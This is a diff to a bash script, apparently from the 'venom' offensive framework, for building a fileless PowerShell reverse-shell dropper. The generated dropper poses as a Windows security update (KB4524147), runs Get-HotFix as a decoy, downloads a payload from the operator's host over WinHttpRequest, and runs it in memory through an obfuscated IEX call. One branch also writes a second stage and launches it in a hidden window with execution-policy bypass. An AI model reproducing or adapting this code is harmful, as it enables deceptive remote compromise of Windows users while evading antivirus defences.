@@ -11995,9 +11995,9 @@ esac
 
 
 
-# ----------------------------------------------
-# Reverse TCP Powershell Shell + WinHttpRequest 
-# ----------------------------------------------
+# --------------------------------------------------------
+# Reverse TCP Powershell Shell + WinHttpRequest (Fileless)
+# --------------------------------------------------------
 sh_evasion1 () {
 Colors;
 
@@ -12013,11 +12013,14 @@ sleep 2
 
 
 ## Store User Inputs (bash variable declarations)..
+easter_egg=$(cat $IPATH/settings|grep -m 1 'OBFUSCATION'|cut -d '=' -f2)
 lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --width 300) > /dev/null 2>&1
 lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 666" --entry --width 300) > /dev/null 2>&1
 Drop=$(zenity --title="☠ Enter DROPPER NAME ☠" --text "example: Update-KB4524147\nWarning: Allways Start FileNames With [Capital Letters]" --entry --width 300) > /dev/null 2>&1
 NaM=$(zenity --title="☠ Enter PAYLOAD NAME ☠" --text "example: Security-Update\nWarning: Allways Start FileNames With [Capital Letters]" --entry --width 300) > /dev/null 2>&1
-rpath=$(zenity --title="☠ Enter Payload Upload Path (target dir) ☠" --text "example: tmp (*)\nexample: ProgramFiles\nexample: LocalAppData\nexample: userprofile\\\\\\\Desktop\n\n(*) Recomended Path For Payload Drop." --entry --width 350) > /dev/null 2>&1
+if [ "$easter_egg" = "ON" ] || [ "$easter_egg" = "on" ]; then
+   rpath=$(zenity --title="☠ Enter Payload Upload Path (target dir) ☠" --text "example: tmp (*)\nexample: ProgramFiles\nexample: LocalAppData\nexample: userprofile\\\\\\\Desktop\n\n(*) Recomended Path For Payload Drop." --entry --width 350) > /dev/null 2>&1
+fi
 
 
 ## setting default values in case user have skip this ..
@@ -12037,7 +12040,7 @@ cat << !
     LOLBin   : WinHttpRequest
     DROPPER  : $IPATH/output/$Drop.ps1
     AGENT    : $IPATH/output/$NaM.ps1
-    UPLOADTO : Fileless ($rpath)
+    UPLOADTO : Fileless (\$env:$rpath)
 !
 echo "---"
 
@@ -12045,42 +12048,34 @@ echo "---"
 ## BUILD DROPPER (with Get-HotFix decoy command)
 # echo "\$proxy=new-object -com WinHttp.WinHttpRequest.5.1;\$proxy.open('GET','http://$lhost/$NaM.ps1',\$false);\$proxy.send();iex \$proxy.responseText" > $IPATH/output/$Drop.ps1
 echo "${BlueF}[☠]${white} Building Obfuscated ps1 dropper ..${white}";sleep 2
-## Read settings from venom-main settings file
-ovni=$(cat $IPATH/settings|grep -m 1 'OBFUSCATION'|cut -d '=' -f2)
 
-if [ "$ovni" = "OFF" ]; then
+if [ "$easter_egg" = "OFF" ] || [ "$easter_egg" = "off" ]; then
    echo "<#" > $IPATH/output/$Drop.ps1
-   echo "Obfuscated Powershell Dropper" >> $IPATH/output/$Drop.ps1
    echo "Framework: venom v1.0.16 (amsi evasion)" >> $IPATH/output/$Drop.ps1
-   echo "Author: @r00t-3xp10it" >> $IPATH/output/$Drop.ps1
    echo "#>" >> $IPATH/output/$Drop.ps1
-   echo "" >> $IPATH/output/$Drop.ps1
    echo "\$host.UI.RawUI.WindowTitle = \"Cumulative Security Update KB4524147\";" >> $IPATH/output/$Drop.ps1
    echo "write-Host \"Please Be Patience While We Search For Available Updates to \$env:computername System ..\" -ForegroundColor gray -BackgroundColor Black;" >> $IPATH/output/$Drop.ps1
-   echo "   Get-HotFix;\$proxy=new-object -com WinHttp.WinHttpRequest.5.1;" >> $IPATH/output/$Drop.ps1
+   echo "   Get-HotFix -Description 'Security Update';\$proxy=new-object -com WinHttp.WinHttpRequest.5.1;" >> $IPATH/output/$Drop.ps1
    echo "        \$proxy.open('GET','http://$lhost/$NaM.ps1',\$false);" >> $IPATH/output/$Drop.ps1
    echo "        \$proxy.send();" >> $IPATH/output/$Drop.ps1
    ## Obfuscated IEX (Invoke-Expression) API call (in PS console)
-   echo "& ('ie'+'x') \$proxy.responseText" >> $IPATH/output/$Drop.ps1
+   echo "& ('ie'+'x') \$proxy.responseText;" >> $IPATH/output/$Drop.ps1
 else
-   ## Attempting to hidde powershell execution terminal
-   # DESCRIPTION: dropper.ps1 will write in $env:tmp folder the dropper/exec (KB4524147_4nF7.ps1)
-   # and then execute it in a powershell hidden console <-- need to know if this works (BETA) ..
+   ## Hidde powershell execution terminal windows
+   # DESCRIPTION: dropper.ps1 will write in $env:tmp folder the REAL dropper (KB4524147_4nF7.ps1)
+   # then execute it in a PS hidden console (to download/exec payload.ps1 in ram) <-- need testing (BETA) ..
    echo "<#" > $IPATH/output/$Drop.ps1
-   echo "Obfuscated Powershell Dropper" >> $IPATH/output/$Drop.ps1
    echo "Framework: venom v1.0.16 (amsi evasion)" >> $IPATH/output/$Drop.ps1
-   echo "Author: @r00t-3xp10it" >> $IPATH/output/$Drop.ps1
    echo "#>" >> $IPATH/output/$Drop.ps1
-   echo "" >> $IPATH/output/$Drop.ps1
    echo "\$host.UI.RawUI.WindowTitle = \"Cumulative Security Update KB4524147\";" >> $IPATH/output/$Drop.ps1
-   echo "write-host \"Please Be Patience While We Search For Available Updates to \$env:userdomain System\";" >> $IPATH/output/$Drop.ps1
+   echo "write-host \"Please Be Patience While We Search For Available Updates to \$env:userdomain System\" -ForegroundColor gray -BackgroundColor Black;" >> $IPATH/output/$Drop.ps1
    echo "Get-HotFix -Description 'Security Update';" >> $IPATH/output/$Drop.ps1
    echo "echo \"\`\$host.UI.RawUI.WindowTitle = \`\"Cumulative Security Update KB4524147\`\";\" > \$env:$rpath\\KB4524147_4nF7.ps1" >> $IPATH/output/$Drop.ps1
    echo "echo \"   \`\$proxy=new-object -com WinHttp.WinHttpRequest.5.1;\" >> \$env:$rpath\\KB4524147_4nF7.ps1" >> $IPATH/output/$Drop.ps1
    echo "echo \"        \`\$proxy.open('GET','http://$lhost/$NaM.ps1',\`\$false);\" >> \$env:$rpath\\KB4524147_4nF7.ps1" >> $IPATH/output/$Drop.ps1
    echo "echo \"        \`\$proxy.send();\" >> \$env:$rpath\\KB4524147_4nF7.ps1" >> $IPATH/output/$Drop.ps1
    echo "echo \"& ('ie'+'x') \`\$proxy.responseText;\" >> \$env:$rpath\\KB4524147_4nF7.ps1" >> $IPATH/output/$Drop.ps1
-   echo "Start-Sleep -seconds 1;PoWeRsHeLl -Execution Bypass -WindowStyle Hidden -NoProfile -File \"\$env:$rpath\\KB4524147_4nF7.ps1\"" >> $IPATH/output/$Drop.ps1 
+   echo "Start-Sleep -Seconds 2;PoWeRsHeLl -Execution Bypass -WindowStyle Hidden -NoProfile -File \"\$env:$rpath\\KB4524147_4nF7.ps1\"" >> $IPATH/output/$Drop.ps1 
 fi
 
 
